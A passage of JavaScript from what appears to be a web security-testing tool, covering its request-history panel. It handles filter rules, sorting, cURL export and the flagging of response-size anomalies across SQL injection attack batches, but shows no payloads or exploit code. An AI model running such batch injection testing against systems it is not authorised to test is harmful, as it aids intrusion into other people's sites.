        sizeOp: '', sizeA: null, sizeB: null,
        rttOp: '', rttA: null, rttB: null,
        urlPat: '',
        bodyPat: '',
        methods: [],
        reqPat: '',
        reqLenOp: '', reqLenA: null, reqLenB: null,
        notePat: '',
        hasNote: '',
        star: '',
      };
    }

    function safeRegex(pat, flags) {
      if (!pat) return null;
      try { return new RegExp(pat, flags || 'i'); }
      catch { return null; }
    }

    /**
     * Pattern match with optional invert.
     * Prefix "!" → NOT match (simple alternative to negative lookahead).
     * Example: !admin  → text must NOT contain / match "admin"
     * Full regex still works:  ^(?!.*admin).*$  is the pure-regex form of the same idea.
     */
    function matchPattern(text, pat) {
      if (pat == null || pat === '') return true;
      let p = String(pat);
      let neg = false;
      if (p.startsWith('!')) {
        neg = true;
        p = p.slice(1);
      }
      const re = safeRegex(p);
      let hit;
      if (re) hit = re.test(String(text ?? ''));
      else hit = String(text ?? '').toLowerCase().includes(p.toLowerCase());
      return neg ? !hit : hit;
    }

    function matchNumeric(op, value, a, b) {
      if (!op) return true;
      const v = Number(value) || 0;
      const na = a != null && a !== '' ? Number(a) : null;
      const nb = b != null && b !== '' ? Number(b) : null;
      if (op === 'gt') return na != null && v > na;
      if (op === 'lt') return na != null && v < na;
      if (op === 'eq') return na != null && v === na;
      if (op === 'between') {
        if (na == null && nb == null) return true;
        if (na != null && nb != null) return v >= na && v <= nb;
        if (na != null) return v >= na;
        return v <= nb;
      }
      return true;
    }

    function matchesAdvancedRule(item, rule) {
      if (!rule) return true;
      const status = item.response?.status ?? 0;
      const bodyLen = (item.response?.body || '').length;
      const rtt = item.response?.timeMs || 0;
      const url = item.url || '';
      const respBody = item.response?.body || '';
      const method = (item.method || 'GET').toUpperCase();
      const reqBody = item.postData || item.payload || '';
      const note = item.note || '';

      // Status ranges OR exact (if any set)
      const ranges = rule.statusRanges || [];
      const exact = rule.statusExact || [];
      if (ranges.length || exact.length) {
        let ok = false;
        if (exact.length && exact.includes(status)) ok = true;
        for (const r of ranges) {
          if (r === '0' && status === 0) ok = true;
          if (r === '2xx' && status >= 200 && status < 300) ok = true;
          if (r === '3xx' && status >= 300 && status < 400) ok = true;
          if (r === '4xx' && status >= 400 && status < 500) ok = true;
          if (r === '5xx' && status >= 500) ok = true;
        }
        if (!ok) return false;
      }

      if (!matchNumeric(rule.sizeOp, bodyLen, rule.sizeA, rule.sizeB)) return false;
      if (!matchNumeric(rule.rttOp, rtt, rule.rttA, rule.rttB)) return false;

      if (rule.urlPat && !matchPattern(url, rule.urlPat)) return false;
      if (rule.bodyPat && !matchPattern(respBody, rule.bodyPat)) return false;
      if (rule.methods && rule.methods.length) {
        if (!rule.methods.includes(method)) return false;
      }
      if (rule.reqPat && !matchPattern(reqBody, rule.reqPat)) return false;
      if (!matchNumeric(rule.reqLenOp, String(reqBody).length, rule.reqLenA, rule.reqLenB)) return false;

      if (rule.notePat && !matchPattern(note, rule.notePat)) return false;
      if (rule.hasNote === 'yes' && !note.trim()) return false;
      if (rule.hasNote === 'no' && note.trim()) return false;

      // Star is global AND
      if (rule.star === 'yes' && !item.pinned) return false;
      if (rule.star === 'no' && item.pinned) return false;

      return true;
    }

    function getActiveFilterRule() {
      const active = state.hfActive || 'all';
      if (active.startsWith('rule:')) {
        const id = active.slice(5);
        // Priority: first matching rule in ordered list wins when evaluating single active rule
        return state.hfRules.find(r => r.id === id) || null;
      }
      // Built-in presets mapped to simple rule or status filter
      return null;
    }

    function itemMatchesCurrentFilter(item) {
      const active = state.hfActive || 'all';
      if (active.startsWith('rule:')) {
        const rule = getActiveFilterRule();
        return matchesAdvancedRule(item, rule ? rule.conditions : null);
      }
      // Preset path (legacy status filter)
      return matchesStatusFilter(item, active);
    }

    function countHfMatches(rule) {
      const total = state.history.length;
      if (!rule) return { matched: total, total };
      let matched = 0;
      state.history.forEach(it => { if (matchesAdvancedRule(it, rule)) matched++; });
      return { matched, total };
    }

    function readAdvForm() {
      const ranges = [...document.querySelectorAll('#advStatusChecks input:checked')].map(i => i.value);
      const exactStr = ($('#advStatusExact')?.value || '').trim();
      const exact = exactStr ? exactStr.split(/[\s,]+/).map(s => parseInt(s, 10)).filter(n => !isNaN(n)) : [];
      const methods = [...document.querySelectorAll('#advMethodChecks input:checked')].map(i => i.value);
      const num = (id) => {
        const el = $(id);
        if (!el || el.value === '') return null;
        const n = Number(el.value);
        return isNaN(n) ? null : n;
      };
      return {
        statusRanges: ranges,
        statusExact: exact,
        sizeOp: $('#advSizeOp')?.value || '',
        sizeA: num('#advSizeA'), sizeB: num('#advSizeB'),
        rttOp: $('#advRttOp')?.value || '',
        rttA: num('#advRttA'), rttB: num('#advRttB'),
        urlPat: $('#advUrlPat')?.value || '',
        bodyPat: $('#advBodyPat')?.value || '',
        methods,
        reqPat: $('#advReqPat')?.value || '',
        reqLenOp: $('#advReqLenOp')?.value || '',
        reqLenA: num('#advReqLenA'), reqLenB: num('#advReqLenB'),
        notePat: $('#advNotePat')?.value || '',
        hasNote: $('#advHasNote')?.value || '',
        star: $('#advStar')?.value || '',
      };
    }

    function writeAdvForm(rule) {
      rule = rule || emptyHfRule();
      document.querySelectorAll('#advStatusChecks input').forEach(inp => {
        inp.checked = (rule.statusRanges || []).includes(inp.value);
        inp.closest('.adv-check')?.classList.toggle('on', inp.checked);
      });
      if ($('#advStatusExact')) $('#advStatusExact').value = (rule.statusExact || []).join(', ');
      const set = (id, v) => { const el = $(id); if (el) el.value = v == null ? '' : v; };
      set('#advSizeOp', rule.sizeOp || '');
      set('#advSizeA', rule.sizeA); set('#advSizeB', rule.sizeB);
      set('#advRttOp', rule.rttOp || '');
      set('#advRttA', rule.rttA); set('#advRttB', rule.rttB);
      set('#advUrlPat', rule.urlPat || '');
      set('#advBodyPat', rule.bodyPat || '');
      document.querySelectorAll('#advMethodChecks input').forEach(inp => {
        inp.checked = (rule.methods || []).includes(inp.value);
        inp.closest('.adv-check')?.classList.toggle('on', inp.checked);
      });
      set('#advReqPat', rule.reqPat || '');
      set('#advReqLenOp', rule.reqLenOp || '');
      set('#advReqLenA', rule.reqLenA); set('#advReqLenB', rule.reqLenB);
      set('#advNotePat', rule.notePat || '');
      set('#advHasNote', rule.hasNote || '');
      set('#advStar', rule.star || '');
      syncAllRangeRows();
    }

    function syncRangeRow(rowId, opId, labelId, unit) {
      const row = $(rowId);
      const op = $(opId)?.value || '';
      if (!row) return;
      const u = unit ? ` (${unit})` : '';
      row.classList.remove('op-off', 'hide-b');
      if (!op) {
        row.classList.add('op-off');
      } else if (op === 'between') {
        const lab = $(labelId);
        if (lab) lab.textContent = 'Min' + u;
      } else {
        row.classList.add('hide-b');
        const lab = $(labelId);
        if (lab) {
          if (op === 'gt') lab.textContent = 'Greater than' + u;
          else if (op === 'lt') lab.textContent = 'Less than' + u;
          else if (op === 'eq') lab.textContent = 'Equal to' + u;
          else lab.textContent = 'Value' + u;
        }
      }
    }

    function syncAllRangeRows() {
      syncRangeRow('#advSizeRow', '#advSizeOp', '#advSizeALabel', 'bytes');
      syncRangeRow('#advRttRow', '#advRttOp', '#advRttALabel', 'ms');
      syncRangeRow('#advReqLenRow', '#advReqLenOp', '#advReqLenALabel', 'bytes');
    }

    function updateAdvLiveCount() {
      const rule = readAdvForm();
      const { matched, total } = countHfMatches(rule);
      const el = $('#advLiveCount');
      if (el) el.innerHTML = `Matching <strong>${matched}</strong> / ${total} · click to preview`;
      const tc = $('#advMatchToolbarCount');
      if (tc) tc.innerHTML = `<span style="color:#00e676">${matched}</span> / ${total}`;
    }

    let advMatchViewMode = 'all'; // all | yes | no

    function renderAdvMatchList() {
      const list = $('#advMatchList');
      if (!list) return;
      const rule = readAdvForm();
      const items = [...state.history].sort((a, b) => b.timestamp - a.timestamp);
      if (!items.length) {
        list.innerHTML = '<div class="adv-hint">No requests in history yet.</div>';
        return;
      }
      const rows = [];
      items.forEach(it => {
        const ok = matchesAdvancedRule(it, rule);
        if (advMatchViewMode === 'yes' && !ok) return;
        if (advMatchViewMode === 'no' && ok) return;
        const status = it.response?.status ?? 0;
        const statusLabel = status === 0 ? 'ERR' : String(status);
        const statusColor = status === 0 || status >= 500 ? '#ff5252'
          : status >= 400 ? '#ffab40'
          : status >= 300 ? '#4fc3f7' : '#00e676';
        const url = (it.url || '').slice(0, 64);
        const rtt = it.response?.timeMs != null ? it.response.timeMs + 'ms' : '—';
        const size = formatBytes((it.response?.body || '').length);
        rows.push(`
          <div class="adv-match-item ${ok ? 'matched' : 'missed'}" data-hid="${it.id}">
            <span class="mm-badge">${ok ? '✓ MATCH' : '✗ MISS'}</span>
            <span class="mm-status" style="color:${statusColor}">${statusLabel}</span>
            <span class="mm-meta" title="${escapeHtml(it.url || '')}">#${it.id} ${escapeHtml(it.method || 'GET')} ${escapeHtml(url)}</span>
            <span style="color:var(--text-muted);flex-shrink:0">${rtt} · ${size}</span>
          </div>
        `);
      });
      list.innerHTML = rows.length
        ? rows.join('')
        : '<div class="adv-hint">No items in this view.</div>';
      list.querySelectorAll('.adv-match-item').forEach(el => {
        el.addEventListener('click', () => {
          const id = +el.dataset.hid;
          if (typeof loadHistoryItem === 'function') loadHistoryItem(id);
        });
      });
      updateAdvLiveCount();
    }

    function openAdvMatchesOverlay() {
      const ov = $('#advMatchOverlay');
      if (ov) ov.classList.add('open');
      renderAdvMatchList();
    }
    function closeAdvMatchesOverlay() {
      const ov = $('#advMatchOverlay');
      if (ov) ov.classList.remove('open');
    }

    function renderHfChips() {
      const row = $('#hfChipRow');
      if (!row) return;
      const active = state.hfActive || 'all';
      const mk = (id, label, cls, title) => {
        const on = active === id || (id === 'batch' && String(active).startsWith('batch:'));
        return `<button type="button" class="hf-chip ${cls}${on ? ' active' : ''}" data-hf="${id}" title="${title || label}">${label}</button>`;
      };
      // One glance: status row + type row (no select, no mystery)
      let html = '<div class="hf-glance">';
      html += '<div class="hf-glance-row hf-glance-status" role="group" aria-label="Status filter">';
      html += mk('all', 'All', 'chip-all', 'Show everything');
      html += mk('starred', '★', 'chip-star', 'Starred only');
      html += mk('2xx', '2xx', 'chip-2xx', 'HTTP 2xx');
      html += mk('3xx', '3xx', 'chip-3xx', 'HTTP 3xx redirects');
      html += mk('4xx', '4xx', 'chip-4xx', 'HTTP 4xx client errors');
      html += mk('5xx', '5xx', 'chip-5xx', 'HTTP 5xx server errors');
      html += mk('0', 'ERR', 'chip-err', 'Network / proxy errors');
      html += '</div>';
      html += '<div class="hf-glance-row hf-glance-type" role="group" aria-label="Request type">';
      html += mk('single', 'Single', 'chip-type', 'Manual single requests');
      html += mk('batch', 'Attacks', 'chip-type chip-atk', 'SQLi attack batches — opens picker');
      html += '</div>';
      const rules = state.hfRules || [];
      if (rules.length) {
        html += '<div class="hf-glance-row hf-glance-rules" role="group" aria-label="Custom rules">';
        rules.forEach((r) => {
          const on = active === 'rule:' + r.id;
          html += `<button type="button" class="hf-chip chip-rule${on ? ' active' : ''}" data-hf="rule:${r.id}" title="${escapeHtml(r.name)}">${escapeHtml(r.name)}<span class="chip-x" data-del-rule="${r.id}" title="Delete rule">×</span></button>`;
        });
        html += '</div>';
      }
      html += '</div>';
      row.innerHTML = html;
      row.querySelectorAll('.hf-chip').forEach(chip => {
        chip.addEventListener('click', (e) => {
          if (e.target.classList.contains('chip-x')) {
            e.stopPropagation();
            const id = e.target.dataset.delRule;
            const rule = state.hfRules.find(r => r.id === id);
            const name = rule?.name || 'this rule';
            if (!confirm(`Delete filter rule «${name}»?\nThis cannot be undone.`)) return;
            state.hfRules = state.hfRules.filter(r => r.id !== id);
            saveHfRules(state.hfRules);
            if (state.hfActive === 'rule:' + id) state.hfActive = 'all';
            renderHfChips();
            renderHistory();
            showToast('Rule deleted');
            return;
          }
          const hf = chip.dataset.hf;
          // Attacks → open multi-select picker first
          if (hf === 'batch') {
            openAttackPicker();
            return;
          }
          state.hfActive = hf;
          if (hf !== 'batch') state.selectedBatchIds = [];
          if (historyStatusFilter && !state.hfActive.startsWith('rule:')) {
            historyStatusFilter.value = state.hfActive;
            state.historyStatusFilter = state.hfActive;
          }
          renderHfChips();
          renderHistory();
        });
      });
    }

    function renderAdvRulesList() {
      const list = $('#advRulesList');
      if (!list) return;
      if (!state.hfRules.length) {
        list.innerHTML = '<div class="adv-hint">No saved rules yet. Build conditions above and click Save Rule.</div>';
        return;
      }
      list.innerHTML = state.hfRules.map((r, i) => `
        <div class="adv-rule-item" data-id="${r.id}">
          <span class="rule-prio">#${i + 1}</span>
          <span class="rule-name">${escapeHtml(r.name)}</span>
          <button type="button" class="btn btn-sm btn-ghost" data-up="${r.id}" title="Higher priority">↑</button>
          <button type="button" class="btn btn-sm btn-ghost" data-down="${r.id}" title="Lower priority">↓</button>
          <button type="button" class="btn btn-sm btn-ghost" data-edit="${r.id}">Edit</button>
          <button type="button" class="btn btn-sm btn-ghost" data-del="${r.id}">Del</button>
        </div>
      `).join('');
      list.querySelectorAll('[data-up]').forEach(btn => {
        btn.addEventListener('click', () => {
          const id = btn.dataset.up;
          const idx = state.hfRules.findIndex(r => r.id === id);
          if (idx > 0) {
            [state.hfRules[idx - 1], state.hfRules[idx]] = [state.hfRules[idx], state.hfRules[idx - 1]];
            saveHfRules(state.hfRules);
            renderAdvRulesList();
            renderHfChips();
          }
        });
      });
      list.querySelectorAll('[data-down]').forEach(btn => {
        btn.addEventListener('click', () => {
          const id = btn.dataset.down;
          const idx = state.hfRules.findIndex(r => r.id === id);
          if (idx >= 0 && idx < state.hfRules.length - 1) {
            [state.hfRules[idx + 1], state.hfRules[idx]] = [state.hfRules[idx], state.hfRules[idx + 1]];
            saveHfRules(state.hfRules);
            renderAdvRulesList();
            renderHfChips();
          }
        });
      });
      list.querySelectorAll('[data-edit]').forEach(btn => {
        btn.addEventListener('click', () => {
          const rule = state.hfRules.find(r => r.id === btn.dataset.edit);
          if (!rule) return;
          writeAdvForm(rule.conditions);
          if ($('#advRuleName')) $('#advRuleName').value = rule.name;
          state.hfEditingId = rule.id;
          updateAdvLiveCount();
          // switch to status tab
          document.querySelector('.adv-filter-tab[data-atab="status"]')?.click();
        });
      });
      list.querySelectorAll('[data-del]').forEach(btn => {
        btn.addEventListener('click', () => {
          const id = btn.dataset.del;
          state.hfRules = state.hfRules.filter(r => r.id !== id);
          saveHfRules(state.hfRules);
          if (state.hfActive === 'rule:' + id) state.hfActive = 'all';
          renderAdvRulesList();
          renderHfChips();
          renderHistory();
        });
      });
    }

    function openAdvFilter() {
      writeAdvForm(state.hfDraft || emptyHfRule());
      if ($('#advRuleName')) $('#advRuleName').value = '';
      state.hfEditingId = null;
      syncAllRangeRows();
      updateAdvLiveCount();
      renderAdvRulesList();
      if (typeof openVPanel === 'function' && VPANEL_MAP && VPANEL_MAP['adv-filter']) {
        openVPanel('adv-filter');
      } else {
        const p = $('#advFilterPanel');
        if (p) {
          p.classList.add('open');
          const bd = $('#vpanelBackdrop');
          if (bd) bd.classList.add('open');
        }
      }
    }

    // Wire advanced filter UI
    (function initAdvFilterUI() {
      const advBtn = $('#hfAdvBtn');
      if (advBtn) advBtn.addEventListener('click', openAdvFilter);

      $$('.adv-filter-tab').forEach(tab => {
        tab.addEventListener('click', () => {
          $$('.adv-filter-tab').forEach(t => t.classList.remove('active'));
          $$('.adv-filter-panel').forEach(p => p.classList.remove('active'));
          tab.classList.add('active');
          const panel = $('#atab-' + tab.dataset.atab);
          if (panel) panel.classList.add('active');
          if (tab.dataset.atab === 'rules') renderAdvRulesList();
        });
      });

      // Live count + dynamic range fields on any form change
      const panels = $('#advFilterPanels');
      if (panels) {
        panels.addEventListener('input', () => {
          updateAdvLiveCount();
          if ($('#advMatchOverlay')?.classList.contains('open')) renderAdvMatchList();
        });
        panels.addEventListener('change', (e) => {
          if (e.target.matches('.adv-check input')) {
            e.target.closest('.adv-check')?.classList.toggle('on', e.target.checked);
          }
          if (e.target.matches('#advSizeOp, #advRttOp, #advReqLenOp')) {
            syncAllRangeRows();
          }
          updateAdvLiveCount();
          if ($('#advMatchOverlay')?.classList.contains('open')) renderAdvMatchList();
        });
      }

      // Click match count → open Matches overlay (not a tab)
      $('#advLiveCount')?.addEventListener('click', openAdvMatchesOverlay);
      $('#advMatchCloseBtn')?.addEventListener('click', closeAdvMatchesOverlay);

      // Match view mode buttons
      $('#advMatchShowAll')?.addEventListener('click', () => { advMatchViewMode = 'all'; renderAdvMatchList(); });
      $('#advMatchShowYes')?.addEventListener('click', () => { advMatchViewMode = 'yes'; renderAdvMatchList(); });
      $('#advMatchShowNo')?.addEventListener('click', () => { advMatchViewMode = 'no'; renderAdvMatchList(); });

      $('#advApplyBtn')?.addEventListener('click', () => {
        const conditions = readAdvForm();
        state.hfDraft = conditions;
        // Apply as temporary active filter (not saved)
        const tmpId = 'tmp';
        state.hfRules = state.hfRules.filter(r => r.id !== tmpId);
        state.hfRules.unshift({ id: tmpId, name: '⚡ Applied', conditions, temp: true });
        state.hfActive = 'rule:' + tmpId;
        renderHfChips();
        renderHistory();
        showToast('Filter applied', 'success');
        // close panel
        const p = $('#advFilterPanel');
        if (p) p.classList.remove('open');
        document.querySelector('.vpanel-backdrop')?.classList.remove('open');
      });

      $('#advSaveBtn')?.addEventListener('click', () => {
        const conditions = readAdvForm();
        const name = ($('#advRuleName')?.value || '').trim() || ('Rule ' + (state.hfRules.filter(r => !r.temp).length + 1));
        if (state.hfEditingId) {
          const r = state.hfRules.find(x => x.id === state.hfEditingId);
          if (r) { r.name = name; r.conditions = conditions; delete r.temp; }
        } else {
          const id = 'r' + Date.now().toString(36);
          state.hfRules.push({ id, name, conditions });
          state.hfActive = 'rule:' + id;
        }
        // drop temp applied
        state.hfRules = state.hfRules.filter(r => !r.temp);
        saveHfRules(state.hfRules.filter(r => !r.temp));
        state.hfEditingId = null;
        renderAdvRulesList();
        renderHfChips();
        renderHistory();
        showToast('Rule saved', 'success');
      });

      $('#advClearBtn')?.addEventListener('click', () => {
        writeAdvForm(emptyHfRule());
        if ($('#advRuleName')) $('#advRuleName').value = '';
        state.hfEditingId = null;
        syncAllRangeRows();
        updateAdvLiveCount();
        if ($('#advMatchOverlay')?.classList.contains('open')) renderAdvMatchList();
      });
    })();

    function ensureAttackFilterOption(batchId, attackName) {
      if (!historyStatusFilter) return;
      const val = 'batch:' + batchId;
      if ([...historyStatusFilter.options].some(o => o.value === val)) return;
      const opt = document.createElement('option');
      opt.value = val;
      opt.textContent = '⚡ ' + attackName;
      // Insert after "All Attacks"
      const batchOpt = [...historyStatusFilter.options].find(o => o.value === 'batch');
      if (batchOpt && batchOpt.nextSibling) {
        historyStatusFilter.insertBefore(opt, batchOpt.nextSibling);
      } else {
        historyStatusFilter.appendChild(opt);
      }
    }

    function applyHistorySort(items) {
      const sort = state.historySort || { key: 'time', dir: 'desc' };
      const key = sort.key;
      const dir = sort.dir === 'asc' ? 1 : -1;
      const arr = [...items];
      const bodyLen = (it) => (it.response.body || '').length;
      const redir = (it) => (it.response.finalUrl && it.response.finalUrl !== it.url) ? 1 : 0;
      const orderIdx = (it) => (it.attackIndex != null ? it.attackIndex : it.timestamp);
      arr.sort((a, b) => {
        if (a.pinned !== b.pinned) return a.pinned ? -1 : 1;
        let cmp = 0;
        switch (key) {
          case 'time': cmp = a.timestamp - b.timestamp; break;
          case 'order': cmp = orderIdx(a) - orderIdx(b); break;
          case 'status': cmp = (a.response.status || 0) - (b.response.status || 0); break;
          case 'size': cmp = bodyLen(a) - bodyLen(b); break;
          case 'rtt': cmp = (a.response.timeMs || 0) - (b.response.timeMs || 0); break;
          case 'redir': cmp = redir(a) - redir(b); break;
          default: cmp = a.timestamp - b.timestamp;
        }
        return cmp * dir;
      });
      return arr;
    }

    function updateAttackSourceBar(statusFilter) {
      const bar = $('#attackSourceBar');
      const hint = $('#attackSourceHint');
      if (!bar) return;
      if (statusFilter && statusFilter.startsWith('batch:')) {
        const bid = statusFilter.slice(6);
        const src = state.attackSources[bid];
        bar.classList.remove('hidden');
        bar.dataset.batchId = bid;
        if (hint) {
          hint.textContent = src
            ? `${src.name || bid} · ${src.urlTemplate || ''}`.slice(0, 60)
            : bid;
          hint.title = src ? `URL: ${src.urlTemplate}\nPayloads:\n${src.payloadText || ''}` : '';
        }
      } else {
        bar.classList.add('hidden');
      }
    }


    function buildCurlCommand(item) {
      if (!item) return '';
      const method = (item.method || 'GET').toUpperCase();
      const url = item.url || '';
      let cmd = 'curl -i';
      if (method !== 'GET') cmd += ` -X ${method}`;
      // Prefer headers captured with the request; else current settings headers
      const hdrs = item.headers && typeof item.headers === 'object'
        ? item.headers
        : (Array.isArray(state.headers)
            ? Object.fromEntries(state.headers.filter((h) => h.key).map((h) => [h.key, h.value || '']))
            : {});
      Object.keys(hdrs || {}).forEach((k) => {
        if (!k) return;
        const v = hdrs[k] == null ? '' : String(hdrs[k]);
        cmd += ` \\\n  -H ${shellQuote(k + ': ' + v)}`;
      });
      const body = item.postBody || '';
      if (body && ['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) {
        cmd += ` \\\n  --data-binary ${shellQuote(body)}`;
      }
      cmd += ` \\\n  ${shellQuote(url)}`;
      return cmd;
    }
    function shellQuote(s) {
      const str = String(s == null ? '' : s);
      if (/^[A-Za-z0-9_./:@%+=,-]+$/.test(str)) return str;
      return "'" + str.replace(/'/g, "'\\''") + "'";
    }

    function renderHistory() {
      const histBadge = $('#historyBadge');
      if (histBadge) {
        const n = state.history.length;
        histBadge.textContent = n > 99 ? '99+' : String(n);
        histBadge.classList.toggle('hidden', n === 0);
      }
      if (state.history.length === 0) {
        historyList.innerHTML = '<div class="history-empty">No requests yet.<br>Send a request to begin.</div>';
        updateAttackSourceBar('all');
        return;
      }

      const q = (state.historySearch || '').toLowerCase().trim();
      // Keep statusFilter in sync with hfActive for batch bar compatibility
      const statusFilter = (state.hfActive && !state.hfActive.startsWith('rule:'))
        ? state.hfActive
        : (state.historyStatusFilter || 'all');
      state.historyStatusFilter = statusFilter;
      updateAttackSourceBar(statusFilter);

      let filtered = getSortedHistory().filter((item) => {
        if (!itemMatchesCurrentFilter(item)) return false;
        if (!q) return true;
        const hay = `${item.url} ${item.payload || ''} ${item.name || ''} ${item.batchName || ''} ${item.method} ${item.response.status} ${item.note || ''}`.toLowerCase();
        return hay.includes(q);
      });

      // Match count badge
      const mc = $('#hfMatchCount');
      if (mc) {
        const total = state.history.length;
        mc.innerHTML = total
          ? `Showing <strong>${filtered.length}</strong> / ${total}`
          : '';
      }

      let sorted = applyHistorySort(filtered);

      if (sorted.length === 0) {
        historyList.innerHTML = '<div class="history-empty">No matching requests.</div>';
        return;
      }

      // Body size stats for coloring (within current filtered set)
      const sizes = sorted.map(it => (it.response.body || '').length);
      const maxSize = Math.max(...sizes);
      const minSize = Math.min(...sizes);
      // Anomaly: sequential jump > 40% and > 150 bytes vs previous in attack order (by timestamp asc within batch)
      const anomalyIds = new Set();
      const byBatch = {};
      sorted.forEach(it => {
        if (!it.batchId) return;
        if (!byBatch[it.batchId]) byBatch[it.batchId] = [];
        byBatch[it.batchId].push(it);
      });
      Object.values(byBatch).forEach(list => {
        list.sort((a, b) => a.timestamp - b.timestamp);
        for (let i = 1; i < list.length; i++) {
          const prev = (list[i - 1].response.body || '').length;
          const cur = (list[i].response.body || '').length;
          const diff = Math.abs(cur - prev);
          if (diff > 150 && (prev === 0 || diff / prev > 0.4)) {
            anomalyIds.add(list[i].id);
          }
        }
      });

      historyList.innerHTML = '';

      const buildHistoryItemEl = (item) => {
        const el = document.createElement('div');
        el.className = 'history-item'
          + (item.id === state.activeHistoryId ? ' active' : '')
          + (item.pinned ? ' pinned' : '');
        el.dataset.id = item.id;
        el.draggable = true;
        el.title = item.url;

        const statusClass = (item.response.status === 0 || item.response.status >= 500) ? 's5xx'
          : item.response.status >= 400 ? 's4xx' : 's2xx';

        const pathLabel = getUrlPath(item.url);
        const displayName = item.name || pathLabel;
        // Prefer payload token, then a short body hint, then URL
        let snippet = '';
        if (item.payload) snippet = String(item.payload).slice(0, 55);
        else if (item.postBody) snippet = String(item.postBody).replace(/\s+/g, ' ').slice(0, 55);
        else snippet = String(item.url || '').slice(0, 55);
        const statusLabel = item.response.status === 0 ? 'ERR' : item.response.status;
        const bodySize = (item.response.body || '').length;
        const sizeLabel = formatBytes(bodySize);
        const relTime = formatRelativeTime(item.timestamp);
        const exactTime = formatExactTime(item.timestamp);
        const wasRedirected = item.response.finalUrl && item.response.finalUrl !== item.url;
        const redirectBadge = wasRedirected
          ? `<span class="redirect-badge" data-final-url="${escapeHtml(item.response.finalUrl)}" title="Redirected → ${escapeHtml(item.response.finalUrl)}\nClick to load Final URL"><svg class="redir-ico" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M8 7h7.2L12.6 4.4 14 3l6 6-6 6-1.4-1.4L15.2 11H8a5 5 0 0 0 0 10h3v2H8a7 7 0 0 1 0-14z"/></svg></span>`
          : '';

        let sizeClass = '';
        if (anomalyIds.has(item.id)) sizeClass = 'size-anomaly';
        else if (bodySize === maxSize && maxSize !== minSize) sizeClass = 'size-max';
        else if (bodySize === minSize && maxSize !== minSize) sizeClass = 'size-min';

        const noteVal = escapeHtml(item.note || '');
        const isDetailOpen = state.openDetailId === item.id;
        const batchLabel = item.batchName || (item.batchId && state.attackSources[item.batchId]?.name) || '';
        const batchTag = batchLabel
          ? `<span class="batch-tag" title="Attack: ${escapeHtml(batchLabel)}">⚡ ${escapeHtml(batchLabel)}</span>`
          : '';
        const setCookies = getSetCookiesFromHeaders(item.response && item.response.headers);
        const cookieBadge = setCookies.length
          ? `<span class="cookie-badge" title="Set-Cookie (${setCookies.length}): ${escapeHtml(setCookies.map(c => c.name).join(', '))}&#10;Click → import into request Cookie header"></span>`
          : '';

        el.innerHTML = `
          <div class="history-item-top">
            <span class="history-method">${item.method}</span>
            <span class="history-name" data-id="${item.id}" title="Double-click to rename&#10;${escapeHtml(item.url)}">${escapeHtml(displayName)}</span>
            ${batchTag}
            ${cookieBadge}
            ${redirectBadge}
            <span class="status-badge ${statusClass}">${statusLabel}</span>
          </div>
          <div class="history-snippet" title="${escapeHtml(item.url)}">${escapeHtml(snippet)}</div>
          <div class="history-meta">
            <span class="history-time">
              <span title="Response time">${item.response.timeMs} ms</span>
              <span class="hist-sep">·</span>
              <span class="${sizeClass}" title="Body size${sizeClass === 'size-anomaly' ? ' — ANOMALY jump' : sizeClass === 'size-max' ? ' — largest in filter' : sizeClass === 'size-min' ? ' — smallest in filter' : ''}">${sizeLabel}</span>
              <span class="hist-sep">·</span>
              <span title="${escapeHtml(exactTime)}">${relTime}</span>
            </span>
            <div class="history-actions">
              <div class="hist-more-cluster" title="Actions">
                <div class="hist-more-extras">
                  <button type="button" class="hist-btn pin-btn${item.pinned ? ' pinned' : ''}" data-id="${item.id}" title="${item.pinned ? 'Unstar' : 'Star'}">${item.pinned ? HIST_ICO.star : HIST_ICO.starOut}</button>
                  <button type="button" class="hist-btn del-btn hist-ico-trash" data-id="${item.id}" title="Delete">${HIST_ICO.trash}</button>
                  <button type="button" class="hist-btn hist-dl-file hist-ico-dl" data-id="${item.id}" title="Download request as .txt">${HIST_ICO.download}</button>
                  <button type="button" class="hist-btn hist-note-btn hist-ico-note${state.openNoteId === item.id ? ' active' : ''}" data-id="${item.id}" title="Toggle note">${HIST_ICO.note}</button>
                  <button type="button" class="hist-btn hist-curl-btn hist-ico-curl" data-id="${item.id}" title="Copy as cURL">${HIST_ICO.code}</button>
                  <button type="button" class="hist-btn hist-dl-url hist-ico-url" data-id="${item.id}" title="Copy full URL">${HIST_ICO.globe}</button>
                </div>
                <button type="button" class="hist-more-trigger" title="Settings">${HIST_ICO.gear}</button>
              </div>
            </div>
          </div>
          <div class="history-detail">
            <div class="hist-req-snapshot">
              <div class="hist-req-row"><span class="hist-req-k">Method</span><code class="hist-req-v">${escapeHtml(item.method)}</code></div>
              <div class="hist-req-row"><span class="hist-req-k">URL</span><code class="hist-req-v" title="${escapeHtml(item.url)}">${escapeHtml(item.url)}</code></div>
              ${item.payload ? `<div class="hist-req-row"><span class="hist-req-k">Payload</span><code class="hist-req-v hist-req-payload">${escapeHtml(String(item.payload))}</code></div>` : ''}
              ${item.postBody ? `<div class="hist-req-row hist-req-body-row"><span class="hist-req-k">Body</span><pre class="hist-req-body" title="${escapeHtml(String(item.postBody))}">${escapeHtml(String(item.postBody).slice(0, 800))}${String(item.postBody).length > 800 ? '\n…' : ''}</pre></div>` : ''}
            </div>
            <textarea class="hist-note${state.openNoteId === item.id ? ' is-open' : ''}" data-id="${item.id}" placeholder="Note for this request…" spellcheck="false" ${state.openNoteId === item.id ? '' : 'hidden'}>${noteVal}</textarea>
            <div class="history-detail-actions">
              <button type="button" class="btn btn-sm hist-apply-wb" data-id="${item.id}" title="Copy this request into URL / Body editors (overwrites workbench)">Load into editor</button>
              ${document.body.classList.contains('solo-history')
                ? `<button type="button" class="btn btn-sm hist-view-response" data-id="${item.id}" title="Open Rendered / Raw / Headers viewer">Response</button>`
                : ''}
            </div>
          </div>`;

        if (isDetailOpen) el.classList.add('detail-open');

        // Click to load + open detail (ignore if clicking buttons, redirect badge, detail, or editing name)
        el.addEventListener('click', (e) => {
          if (e.target.closest('.hist-btn') || e.target.closest('.hist-more-cluster') || e.target.closest('.redirect-badge') ||
              e.target.closest('.history-detail') || e.target.classList.contains('history-name')) return;
          state.openDetailId = item.id;
          loadHistoryItem(item.id);
          // Expand response if minimized
          if (typeof setResponseCollapsed === 'function') setResponseCollapsed(false);
          renderHistory();
        });

        // Drag & Drop
        el.addEventListener('dragstart', (e) => {
          state.dragId = item.id;
          el.classList.add('dragging');
          e.dataTransfer.effectAllowed = 'move';
        });
        el.addEventListener('dragend', () => {
